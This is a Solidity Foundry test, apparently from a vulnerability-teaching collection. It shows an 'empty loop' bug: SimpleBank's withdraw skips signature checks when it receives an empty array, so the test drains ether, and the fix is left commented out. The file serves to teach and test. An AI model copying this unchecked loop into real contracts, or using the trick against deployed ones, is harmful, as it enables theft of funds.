// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*
Name: Empty loop issue

Description:
Due to insufficient validation, an attacker can simply pass an empty array to bypass the loop and signature verification.

Mitigation:  
Check the number of signatures  
require(sigs.length > 0, "No signatures provided");

REF:
https://twitter.com/1nf0s3cpt/status/1673195574215213057
https://twitter.com/akshaysrivastv/status/1648310441058115592
https://dacian.me/exploiting-developer-assumptions#heading-unexpected-empty-inputs
*/
contract ContractTest is Test {
    SimpleBank SimpleBankContract;

    function setUp() public {
        SimpleBankContract = new SimpleBank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleBankContract)).transfer(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input
        //sigs[0] = SimpleBank.Signature("", 0, "", "");

        console.log(
            "Before exploiting, Alice's ether balance",
            address(alice).balance
        );
        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).balance
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {
        // Mitigation: Check the number of signatures
        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}
